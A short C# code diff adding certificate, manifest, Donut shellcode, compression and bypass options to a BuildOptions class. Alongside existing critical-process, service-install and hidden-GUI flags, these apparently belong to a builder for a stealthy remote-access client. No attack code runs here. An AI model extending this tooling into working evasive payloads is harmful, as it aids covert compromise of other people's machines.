@@ -1,4 +1,6 @@
-﻿namespace Pulsar.Server.Models
+﻿using Pulsar.Server.Helper;
+
+namespace Pulsar.Server.Models
 {
     public class BuildOptions
     {
@@ -28,5 +30,10 @@
         public bool CRITICALPROCESS { get; set; }
         public bool INSTALLSERVICE { get; set; }
         public bool SHOWCLIENTGUI { get; set; }
+        public string CertificatePath { get; set; }
+        public string DonutPath { get; set; }
+        public string ManifestPath { get; set; }
+        public Compress ShellcodeCompression { get; set; } = Compress.None;
+        public Bypass ShellcodeBypass { get; set; } = Bypass.None;
     }
 }
